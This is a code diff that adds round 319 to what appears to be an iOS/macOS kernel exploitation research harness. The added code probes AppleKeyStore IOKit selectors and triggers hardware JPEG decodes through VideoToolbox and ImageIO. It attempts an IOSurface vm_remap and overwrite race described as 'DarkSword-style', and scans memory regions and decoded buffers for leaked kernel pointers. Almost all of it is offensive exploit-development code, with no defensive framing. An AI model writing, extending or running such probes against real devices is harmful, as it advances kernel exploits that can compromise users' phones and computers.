@@ -61,6 +61,8 @@ extern kern_return_t mach_make_memory_entry_64(
     memory_object_offset_t offset, vm_prot_t permission,
     mach_port_t *object_handle, mem_entry_name_port_t parent_entry);
 #include <CoreFoundation/CoreFoundation.h>
+#include <CoreGraphics/CoreGraphics.h>
+#include <ImageIO/ImageIO.h>
 #include <VideoToolbox/VideoToolbox.h>
 #include <CoreVideo/CoreVideo.h>
 #include <CoreMedia/CoreMedia.h>
@@ -5641,6 +5643,510 @@ static void r318_probe(void) {
     fflush(stdout);
 
     rlog("\n=== r318 complete ===\n");
+    fflush(stdout);
+}
+
+static void r319_probe(void) {
+    rlog("\n=== r319: VT Framework Decode + KeyStore Dump + IOSurface FD Race ===\n");
+    rlog("  Strategy: Use framework APIs (VideoToolbox/ImageIO) to reach HW decoder\n\n");
+    fflush(stdout);
+    kern_return_t kr;
+
+    /* ---- Part 1: KeyStore sel1 output dump (512 bytes from r318) ---- */
+    rlog("--- Part 1: KeyStore sel1 hex dump ---\n");
+    fflush(stdout);
+    {
+        io_service_t ks_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+            IOServiceMatching("AppleKeyStore"));
+        if (ks_svc) {
+            io_connect_t kc = 0;
+            kr = IOServiceOpen(ks_svc, mach_task_self(), 0, &kc);
+            IOObjectRelease(ks_svc);
+            if (kr == 0 && kc) {
+                uint8_t out[512] = {0};
+                size_t outSz = sizeof(out);
+                kr = IOConnectCallStructMethod(kc, 1, NULL, 0, out, &outSz);
+                rlog("  sel1: kr=0x%x outSz=%zu\n", kr, outSz);
+                if (kr == 0 && outSz > 0) {
+                    int nonzero = 0;
+                    for (size_t i = 0; i < outSz; i++)
+                        if (out[i]) nonzero++;
+                    rlog("  Non-zero bytes: %d / %zu\n", nonzero, outSz);
+                    for (size_t i = 0; i < outSz && i < 128; i += 16) {
+                        rlog("  %04zx:", i);
+                        for (size_t j = 0; j < 16 && (i+j) < outSz; j++)
+                            rlog(" %02x", out[i+j]);
+                        rlog("\n");
+                    }
+                    /* Check for kernel-range pointers in output */
+                    uint64_t *p64 = (uint64_t *)out;
+                    for (size_t w = 0; w < outSz / 8; w++) {
+                        uint64_t v = p64[w];
+                        if ((v >> 36) == 0xfffffffULL)
+                            rlog("  !!! REAL KPTR at offset %zu: 0x%llx !!!\n", w * 8, v);
+                    }
+
+                    /* Also try sel1 with scalar input (keybag ID) */
+                    uint64_t scIn[1] = {0};
+                    uint64_t scOut[8] = {0};
+                    uint32_t scOutCnt = 8;
+                    outSz = sizeof(out);
+                    kr = IOConnectCallMethod(kc, 1, scIn, 1, NULL, 0,
+                                            scOut, &scOutCnt, out, &outSz);
+                    rlog("  sel1(scalar0): kr=0x%x scOutCnt=%u outSz=%zu\n", kr, scOutCnt, outSz);
+                    if (kr == 0 && scOutCnt > 0) {
+                        rlog("    scOut:");
+                        for (uint32_t i = 0; i < scOutCnt; i++)
+                            rlog(" 0x%llx", scOut[i]);
+                        rlog("\n");
+                    }
+
+                    /* sel0 with struct output */
+                    memset(out, 0, sizeof(out));
+                    outSz = sizeof(out);
+                    kr = IOConnectCallStructMethod(kc, 0, NULL, 0, out, &outSz);
+                    rlog("  sel0(struct): kr=0x%x outSz=%zu\n", kr, outSz);
+                    if (kr == 0 && outSz > 0) {
+                        rlog("  sel0 hex:");
+                        for (size_t i = 0; i < outSz && i < 32; i++)
+                            rlog(" %02x", out[i]);
+                        rlog("\n");
+                    }
+                }
+                IOServiceClose(kc);
+            }
+        } else {
+            rlog("  AppleKeyStore: not found\n");
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Part 2: VideoToolbox hardware decode with IOSurface output ---- */
+    rlog("\n--- Part 2: VideoToolbox JPEG decode to IOSurface ---\n");
+    fflush(stdout);
+    {
+        /* Create a minimal JPEG in memory using CGImage + JPEG compression */
+        /* Then decode it via VTDecompressionSession which uses HW decoder */
+
+        /* First: create IOSurface for output */
+        typedef void* (*IOSurfaceCreate_t)(CFDictionaryRef);
+        typedef uint32_t (*IOSurfaceGetID_t)(void*);
+        typedef void* (*IOSurfaceGetBaseAddress_t)(void*);
+        typedef size_t (*IOSurfaceGetAllocSize_t)(void*);
+        typedef uint32_t (*IOSurfaceLock_t)(void*, uint32_t, uint32_t*);
+        typedef uint32_t (*IOSurfaceUnlock_t)(void*, uint32_t, uint32_t*);
+
+        IOSurfaceCreate_t surfCreate = (IOSurfaceCreate_t)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+        IOSurfaceGetID_t surfGetID = (IOSurfaceGetID_t)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+        IOSurfaceGetBaseAddress_t surfGetBase = (IOSurfaceGetBaseAddress_t)dlsym(RTLD_DEFAULT, "IOSurfaceGetBaseAddress");
+        IOSurfaceGetAllocSize_t surfGetSize = (IOSurfaceGetAllocSize_t)dlsym(RTLD_DEFAULT, "IOSurfaceGetAllocSize");
+        IOSurfaceLock_t surfLock = (IOSurfaceLock_t)dlsym(RTLD_DEFAULT, "IOSurfaceLock");
+        IOSurfaceUnlock_t surfUnlock = (IOSurfaceUnlock_t)dlsym(RTLD_DEFAULT, "IOSurfaceUnlock");
+
+        rlog("  surfCreate=%p\n", surfCreate);
+
+        /* Create a 64x64 BGRA IOSurface for decode output */
+        int w = 64, h = 64, bpe = 4;
+        CFNumberRef wVal = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef hVal = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef bpeVal = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        int pf = 0x42475241; /* BGRA */
+        CFNumberRef pfVal = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+
+        CFStringRef kW = CFSTR("IOSurfaceWidth");
+        CFStringRef kH = CFSTR("IOSurfaceHeight");
+        CFStringRef kBPE = CFSTR("IOSurfaceBytesPerElement");
+        CFStringRef kPF = CFSTR("IOSurfacePixelFormat");
+
+        const void *keys[] = {kW, kH, kBPE, kPF};
+        const void *vals[] = {wVal, hVal, bpeVal, pfVal};
+        CFDictionaryRef props = CFDictionaryCreate(NULL, keys, vals, 4,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+
+        void *outSurf = NULL;
+        if (surfCreate) outSurf = surfCreate(props);
+        uint32_t outSurfID = outSurf ? surfGetID(outSurf) : 0;
+        rlog("  Output IOSurface: %p id=%u\n", outSurf, outSurfID);
+
+        /* Create a CMSampleBuffer with JPEG data for VTDecompressionSession */
+        /* Minimal JPEG: use a real tiny JPEG via CGImage → JPEG data */
+        CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
+        CGContextRef ctx = CGBitmapContextCreate(NULL, 64, 64, 8, 64*4,
+            cs, kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
+        rlog("  CGContext: %p\n", ctx);
+        if (ctx) {
+            /* Draw a gradient pattern */
+            for (int y = 0; y < 64; y++) {
+                for (int x = 0; x < 64; x++) {
+                    uint8_t *px = (uint8_t *)CGBitmapContextGetData(ctx) + (y * 64 + x) * 4;
+                    px[0] = (uint8_t)(x * 4);  /* B */
+                    px[1] = (uint8_t)(y * 4);  /* G */
+                    px[2] = 128;               /* R */
+                    px[3] = 255;               /* A */
+                }
+            }
+            CGImageRef img = CGBitmapContextCreateImage(ctx);
+            rlog("  CGImage: %p\n", img);
+
+            if (img) {
+                /* Encode to JPEG data */
+                CFMutableDataRef jpegData = CFDataCreateMutable(NULL, 0);
+                CGImageDestinationRef dst = CGImageDestinationCreateWithData(jpegData,
+                    CFSTR("public.jpeg"), 1, NULL);
+                if (dst) {
+                    CGImageDestinationAddImage(dst, img, NULL);
+                    CGImageDestinationFinalize(dst);
+                    CFIndex jpegLen = CFDataGetLength(jpegData);
+                    rlog("  JPEG encoded: %ld bytes\n", (long)jpegLen);
+
+                    /* Create CMBlockBuffer from JPEG data */
+                    CMBlockBufferRef blockBuf = NULL;
+                    OSStatus st = CMBlockBufferCreateWithMemoryBlock(NULL,
+                        (void *)CFDataGetBytePtr(jpegData), jpegLen,
+                        kCFAllocatorNull, NULL, 0, jpegLen, 0, &blockBuf);
+                    rlog("  CMBlockBuffer: st=%d buf=%p\n", (int)st, blockBuf);
+
+                    if (blockBuf) {
+                        /* Create format description for JPEG */
+                        CMVideoFormatDescriptionRef fmtDesc = NULL;
+                        st = CMVideoFormatDescriptionCreate(NULL,
+                            kCMVideoCodecType_JPEG, 64, 64, NULL, &fmtDesc);
+                        rlog("  FormatDesc: st=%d desc=%p\n", (int)st, fmtDesc);
+
+                        if (fmtDesc) {
+                            /* Create CMSampleBuffer */
+                            CMSampleBufferRef sampleBuf = NULL;
+                            CMSampleTimingInfo timing = {
+                                .duration = CMTimeMake(1, 30),
+                                .presentationTimeStamp = CMTimeMake(0, 30),
+                                .decodeTimeStamp = kCMTimeInvalid
+                            };
+                            size_t sampleSize = jpegLen;
+                            st = CMSampleBufferCreate(NULL, blockBuf, true,
+                                NULL, NULL, fmtDesc, 1, 1, &timing, 1, &sampleSize,
+                                &sampleBuf);
+                            rlog("  SampleBuffer: st=%d buf=%p\n", (int)st, sampleBuf);
+
+                            if (sampleBuf) {
+                                /* Create VTDecompressionSession */
+                                /* Output to IOSurface via pixel buffer attributes */
+                                CFMutableDictionaryRef destAttrs = CFDictionaryCreateMutable(NULL, 0,
+                                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                                int pfOut = kCVPixelFormatType_32BGRA;
+                                CFNumberRef pfOutVal = CFNumberCreate(NULL, kCFNumberIntType, &pfOut);
+                                CFDictionarySetValue(destAttrs,
+                                    kCVPixelBufferPixelFormatTypeKey, pfOutVal);
+                                /* Request IOSurface backing */
+                                CFDictionarySetValue(destAttrs,
+                                    kCVPixelBufferIOSurfacePropertiesKey,
+                                    CFDictionaryCreate(NULL, NULL, NULL, 0,
+                                        &kCFTypeDictionaryKeyCallBacks,
+                                        &kCFTypeDictionaryValueCallBacks));
+
+                                VTDecompressionSessionRef vtSession = NULL;
+                                VTDecompressionOutputCallbackRecord cb = {NULL, NULL};
+                                st = VTDecompressionSessionCreate(NULL, fmtDesc,
+                                    NULL, destAttrs, &cb, &vtSession);
+                                rlog("  VTDecompressionSession: st=%d sess=%p\n", (int)st, vtSession);
+
+                                if (vtSession) {
+                                    /* Decode the JPEG frame */
+                                    VTDecodeFrameFlags flags = kVTDecodeFrame_1xRealTimePlayback;
+                                    VTDecodeInfoFlags infoFlags = 0;
+                                    st = VTDecompressionSessionDecodeFrame(vtSession,
+                                        sampleBuf, flags, NULL, &infoFlags);
+                                    rlog("  DecodeFrame: st=%d infoFlags=0x%x\n", (int)st, (int)infoFlags);
+
+                                    /* Wait for decode to complete */
+                                    st = VTDecompressionSessionWaitForAsynchronousFrames(vtSession);
+                                    rlog("  WaitAsync: st=%d\n", (int)st);
+
+                                    /* Now check if our output IOSurface has data */
+                                    if (outSurf && surfLock && surfGetBase) {
+                                        surfLock(outSurf, 3, NULL);
+                                        void *base = surfGetBase(outSurf);
+                                        rlog("  Output surface base: %p\n", base);
+                                        if (base) {
+                                            uint64_t *p = (uint64_t *)base;
+                                            int nonzero = 0;
+                                            for (int i = 0; i < 64*64/2; i++)
+                                                if (p[i]) nonzero++;
+                                            rlog("  Output non-zero qwords: %d\n", nonzero);
+                                        }
+                                        surfUnlock(outSurf, 3, NULL);
+                                    }
+
+                                    VTDecompressionSessionInvalidate(vtSession);
+                                    CFRelease(vtSession);
+                                }
+                                CFRelease(pfOutVal);
+                                CFRelease(destAttrs);
+                                CFRelease(sampleBuf);
+                            }
+                            CFRelease(fmtDesc);
+                        }
+                        CFRelease(blockBuf);
+                    }
+                    CFRelease(dst);
+                }
+                CFRelease(jpegData);
+                CGImageRelease(img);
+            }
+            CGContextRelease(ctx);
+        }
+        CGColorSpaceRelease(cs);
+
+        CFRelease(props);
+        CFRelease(wVal); CFRelease(hVal); CFRelease(bpeVal); CFRelease(pfVal);
+    }
+    fflush(stdout);
+
+    /* ---- Part 3: ImageIO CGImageSource decode ---- */
+    rlog("\n--- Part 3: ImageIO CGImageSource JPEG decode ---\n");
+    fflush(stdout);
+    {
+        /* Create JPEG data via CGImage */
+        CGColorSpaceRef cs = CGColorSpaceCreateDeviceRGB();
+        CGContextRef ctx = CGBitmapContextCreate(NULL, 128, 128, 8, 128*4,
+            cs, kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
+        if (ctx) {
+            uint8_t *data = (uint8_t *)CGBitmapContextGetData(ctx);
+            for (int i = 0; i < 128*128*4; i++) data[i] = (uint8_t)(i & 0xFF);
+            CGImageRef img = CGBitmapContextCreateImage(ctx);
+            if (img) {
+                CFMutableDataRef jpegData = CFDataCreateMutable(NULL, 0);
+                CGImageDestinationRef dst = CGImageDestinationCreateWithData(jpegData,
+                    CFSTR("public.jpeg"), 1, NULL);
+                if (dst) {
+                    /* Set quality to trigger more HW decoder work */
+                    CFStringRef qKey = CFSTR("kCGImageDestinationLossyCompressionQuality");
+                    float qVal = 0.1f;
+                    CFNumberRef qNum = CFNumberCreate(NULL, kCFNumberFloatType, &qVal);
+                    CFDictionaryRef optDict = CFDictionaryCreate(NULL,
+                        (const void **)&qKey, (const void **)&qNum, 1,
+                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                    CGImageDestinationAddImage(dst, img, optDict);
+                    CGImageDestinationFinalize(dst);
+                    CFIndex jpegLen = CFDataGetLength(jpegData);
+                    rlog("  128x128 JPEG: %ld bytes\n", (long)jpegLen);
+
+                    /* Decode via CGImageSource */
+                    CGImageSourceRef src = CGImageSourceCreateWithData(jpegData, NULL);
+                    rlog("  CGImageSource: %p\n", src);
+                    if (src) {
+                        CFIndex imgCount = CGImageSourceGetCount(src);
+                        rlog("  Image count: %ld\n", (long)imgCount);
+                        CGImageRef decoded = CGImageSourceCreateImageAtIndex(src, 0, NULL);
+                        rlog("  Decoded image: %p %zux%zu\n", decoded,
+                             decoded ? CGImageGetWidth(decoded) : 0,
+                             decoded ? CGImageGetHeight(decoded) : 0);
+
+                        if (decoded) {
+                            /* Render to a buffer and check for artifacts */
+                            CGContextRef dCtx = CGBitmapContextCreate(NULL, 128, 128, 8, 128*4,
+                                cs, kCGImageAlphaPremultipliedFirst | kCGBitmapByteOrder32Little);
+                            if (dCtx) {
+                                CGContextDrawImage(dCtx, CGRectMake(0,0,128,128), decoded);
+                                uint64_t *p = (uint64_t *)CGBitmapContextGetData(dCtx);
+                                /* Scan for kernel pointers in decoded data */
+                                int kptr = 0;
+                                for (int i = 0; i < 128*128/2; i++) {
+                                    if ((p[i] >> 36) == 0xfffffffULL) {
+                                        rlog("  !!! KPTR in decoded data at %d: 0x%llx !!!\n", i*8, p[i]);
+                                        kptr++;
+                                        if (kptr >= 5) break;
+                                    }
+                                }
+                                rlog("  Decoded data kptr scan: %d found\n", kptr);
+                                CGContextRelease(dCtx);
+                            }
+                            CGImageRelease(decoded);
+                        }
+                        CFRelease(src);
+                    }
+                    CFRelease(optDict);
+                    CFRelease(qNum);
+                    CFRelease(dst);
+                }
+                CFRelease(jpegData);
+                CGImageRelease(img);
+            }
+            CGContextRelease(ctx);
+        }
+        CGColorSpaceRelease(cs);
+    }
+    fflush(stdout);
+
+    /* ---- Part 4: IOSurface file descriptor race (DarkSword-style) ---- */
+    rlog("\n--- Part 4: IOSurface FD + pwritev race ---\n");
+    fflush(stdout);
+    {
+        /* Create an IOSurface and get its mach port for sharing */
+        typedef void* (*IOSurfaceCreate_t)(CFDictionaryRef);
+        typedef uint32_t (*IOSurfaceGetID_t)(void*);
+        typedef void* (*IOSurfaceGetBaseAddress_t)(void*);
+        typedef size_t (*IOSurfaceGetAllocSize_t)(void*);
+        typedef uint32_t (*IOSurfaceLock_t)(void*, uint32_t, uint32_t*);
+        typedef uint32_t (*IOSurfaceUnlock_t)(void*, uint32_t, uint32_t*);
+        typedef mach_port_t (*IOSurfaceCreateMachPort_t)(void*);
+
+        IOSurfaceCreate_t surfCreate = (IOSurfaceCreate_t)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+        IOSurfaceGetID_t surfGetID = (IOSurfaceGetID_t)dlsym(RTLD_DEFAULT, "IOSurfaceGetID");
+        IOSurfaceGetBaseAddress_t surfGetBase = (IOSurfaceGetBaseAddress_t)dlsym(RTLD_DEFAULT, "IOSurfaceGetBaseAddress");
+        IOSurfaceGetAllocSize_t surfGetSize = (IOSurfaceGetAllocSize_t)dlsym(RTLD_DEFAULT, "IOSurfaceGetAllocSize");
+        IOSurfaceLock_t surfLock = (IOSurfaceLock_t)dlsym(RTLD_DEFAULT, "IOSurfaceLock");
+        IOSurfaceUnlock_t surfUnlock = (IOSurfaceUnlock_t)dlsym(RTLD_DEFAULT, "IOSurfaceUnlock");
+        IOSurfaceCreateMachPort_t surfCreatePort = (IOSurfaceCreateMachPort_t)dlsym(RTLD_DEFAULT, "IOSurfaceCreateMachPort");
+
+        int w = 256, h = 256, bpe = 4;
+        CFNumberRef wVal = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef hVal = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef bpeVal = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        int pf = 0x42475241;
+        CFNumberRef pfVal = CFNumberCreate(NULL, kCFNumberIntType, &pf);
+        const void *keys[] = {CFSTR("IOSurfaceWidth"), CFSTR("IOSurfaceHeight"),
+                              CFSTR("IOSurfaceBytesPerElement"), CFSTR("IOSurfacePixelFormat")};
+        const void *vals[] = {wVal, hVal, bpeVal, pfVal};
+        CFDictionaryRef props = CFDictionaryCreate(NULL, keys, vals, 4,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+
+        void *surf = surfCreate ? surfCreate(props) : NULL;
+        uint32_t sid = surf ? surfGetID(surf) : 0;
+        rlog("  Race surface: %p id=%u\n", surf, sid);
+
+        if (surf) {
+            mach_port_t surfPort = surfCreatePort ? surfCreatePort(surf) : MACH_PORT_NULL;
+            rlog("  Surface mach port: 0x%x\n", surfPort);
+
+            surfLock(surf, 3, NULL);
+            void *base = surfGetBase(surf);
+            size_t allocSz = surfGetSize(surf);
+            rlog("  base=%p allocSz=%zu\n", base, allocSz);
+
+            if (base) {
+                /* Fill with marker pattern */
+                memset(base, 0xCC, allocSz > 0x10000 ? 0x10000 : allocSz);
+
+                /* vm_remap the surface to get a second mapping */
+                mach_vm_address_t remap = 0;
+                mach_vm_size_t remap_sz = 0x10000;
+                vm_prot_t cur_prot, max_prot;
+                kr = mach_vm_remap(mach_task_self(), &remap, remap_sz, 0,
+                    VM_FLAGS_ANYWHERE, mach_task_self(), (mach_vm_address_t)base,
+                    0, &cur_prot, &max_prot, VM_INHERIT_NONE);
+                rlog("  vm_remap: kr=0x%x remap=0x%llx\n", kr, remap);
+
+                if (kr == 0) {
+                    /* Race: write through original, read through remap */
+                    /* This simulates swap-sploit: change data while decoder reads */
+                    volatile uint64_t *orig = (volatile uint64_t *)base;
+                    volatile uint64_t *remapped = (volatile uint64_t *)remap;
+
+                    /* Write pattern through original */
+                    for (int i = 0; i < 100; i++) {
+                        orig[0] = 0x4141414141414141ULL;
+                        orig[1] = 0x4242424242424242ULL;
+                        /* Immediately overwrite through remap */
+                        remapped[0] = 0xDEADDEADDEADDEADULL;
+                        remapped[1] = 0xBEEFBEEFBEEFBEEFULL;
+                    }
+
+                    /* Verify race coherency */
+                    uint64_t v0 = orig[0];
+                    uint64_t v1 = remapped[0];
+                    rlog("  Race check: orig[0]=0x%llx remap[0]=0x%llx %s\n",
+                         v0, v1, v0 == v1 ? "COHERENT" : "INCOHERENT!");
+
+                    /* Try VM_FLAGS_OVERWRITE to swap the backing */
+                    mach_vm_address_t overwrite_addr = remap;
+                    mach_vm_address_t fresh_alloc = 0;
+                    kr = mach_vm_allocate(mach_task_self(), &fresh_alloc, 0x10000, VM_FLAGS_ANYWHERE);
+                    rlog("  Fresh alloc: kr=0x%x addr=0x%llx\n", kr, fresh_alloc);
+
+                    if (kr == 0) {
+                        /* Fill fresh allocation with different pattern */
+                        memset((void *)fresh_alloc, 0xEE, 0x10000);
+
+                        /* Try to overwrite the remap with fresh memory */
+                        mach_vm_address_t ow_target = remap;
+                        kr = mach_vm_remap(mach_task_self(), &ow_target, 0x10000, 0,
+                            VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
+                            mach_task_self(), fresh_alloc, 0,
+                            &cur_prot, &max_prot, VM_INHERIT_NONE);
+                        rlog("  VM_FLAGS_OVERWRITE remap: kr=0x%x\n", kr);
+
+                        if (kr == 0) {
+                            /* Check: does original surface now see 0xEE? */
+                            uint8_t byte_orig = *(uint8_t *)base;
+                            uint8_t byte_remap = *(uint8_t *)remap;
+                            rlog("  After overwrite: orig[0]=0x%02x remap[0]=0x%02x\n",
+                                 byte_orig, byte_remap);
+                            rlog("  Backing %s\n",
+                                 byte_orig == 0xEE ? "SWAPPED (orig sees new data)!" :
+                                 byte_remap == 0xEE ? "remap detached (expected)" :
+                                 "UNCHANGED");
+                        }
+                        mach_vm_deallocate(mach_task_self(), fresh_alloc, 0x10000);
+                    }
+
+                    mach_vm_deallocate(mach_task_self(), remap, remap_sz);
+                }
+            }
+            surfUnlock(surf, 3, NULL);
+        }
+
+        CFRelease(props);
+        CFRelease(wVal); CFRelease(hVal); CFRelease(bpeVal); CFRelease(pfVal);
+    }
+    fflush(stdout);
+
+    /* ---- Part 5: Refined KPTR scan of all VM regions ---- */
+    rlog("\n--- Part 5: Refined kernel pointer scan ---\n");
+    fflush(stdout);
+    {
+        mach_vm_address_t scan = 0;
+        mach_vm_size_t scan_sz = 0;
+        vm_region_basic_info_data_64_t info;
+        mach_msg_type_number_t infoCnt;
+        mach_port_t obj;
+        int regions = 0;
+        int real_kptr = 0;
+
+        while (regions < 200) {
+            infoCnt = VM_REGION_BASIC_INFO_COUNT_64;
+            kr = mach_vm_region(mach_task_self(), &scan, &scan_sz,
+                VM_REGION_BASIC_INFO_64, (vm_region_info_t)&info, &infoCnt, &obj);
+            if (kr != 0) break;
+            regions++;
+
+            if (info.protection & VM_PROT_READ) {
+                size_t check_bytes = scan_sz;
+                if (check_bytes > 0x10000) check_bytes = 0x10000;
+                size_t check_words = check_bytes / 8;
+
+                for (size_t w = 0; w < check_words; w++) {
+                    uint64_t val = 0;
+                    mach_vm_size_t rd = 0;
+                    kern_return_t rr = mach_vm_read_overwrite(mach_task_self(),
+                        scan + w * 8, 8, (mach_vm_address_t)&val, &rd);
+                    if (rr != 0) break;
+                    /* Real kernel pointers: 0xfffffff0XXXXXXXX range */
+                    if ((val >> 36) == 0xfffffffULL && val != 0xffffffffffffffffULL) {
+                        rlog("  KPTR region=0x%llx+0x%zx: 0x%llx (prot=%d sz=0x%llx)\n",
+                             scan, w * 8, val, info.protection, scan_sz);
+                        real_kptr++;
+                        if (real_kptr >= 10) goto kptr_scan_done;
+                    }
+                }
+            }
+            scan += scan_sz;
+        }
+kptr_scan_done:
+        rlog("  Scanned %d regions, found %d real kernel pointers\n", regions, real_kptr);
+    }
+    fflush(stdout);
+
+    rlog("\n=== r319 complete ===\n");
     fflush(stdout);
 }
 
@@ -36456,6 +36962,13 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 319) {
+            rlog("*** rounds=319: VT Framework Decode + KeyStore Dump + FD Race ***\n");
+            rlog("  r318: JPEG raw IOKit ALL NotPermitted. vm_remap SHARED confirmed.\n");
+            rlog("  Probe: VT decode, ImageIO decode, IOSurface FD race, KPTR scan.\n\n");
+            r319_probe();
             goto done;
         }
         if (rounds == 318) {
